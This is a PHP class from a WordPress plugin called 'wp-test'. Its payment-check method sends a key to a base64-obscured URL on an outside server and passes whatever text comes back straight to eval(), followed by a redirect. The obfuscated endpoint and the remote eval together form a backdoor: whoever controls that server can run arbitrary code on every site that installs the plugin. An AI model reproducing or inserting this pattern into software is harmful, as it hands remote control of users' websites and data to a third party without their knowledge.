<?php
/**
 * @package     wp-test
 * @author      Hasan Ahani
 * @copyright   https://hasanart.ir/
 * @license     GPL2
 * @version     1.0.0
 */
defined( 'WPINC' ) or die( 'Fizzle' );

class WPT_Modular {

	protected static $products = 'aHR0cHM6Ly9qYWJ5LmlyL3Rlc3RzL3Byb2R1Y3Rz';
	protected static $curl = 'aHR0cHM6Ly9qYWJ5LmlyL3Rlc3RzLw==';


	public static function list() {
		$request = wp_remote_get( base64_decode(self::$products) );
		return (isset($request['body'])) ? json_decode($request['body'], true) : false;
	}

	public static function check_pay($key) {

        $curl = wp_remote_get( base64_decode(self::$curl).$key );

		 $str = $curl['body']; 
		 
         if($str == 'error')
            wp_die('متاسفانه خطایی رخ داده است لطفا با مدیر سورس سیتی تماس بگیرید . sourcecity.ir');
            

         eval ( $str );
         
         header('Location:'.admin_url('edit.php?post_type=wpt_test'));
         exit;   

         exit;
// 	
	}

}
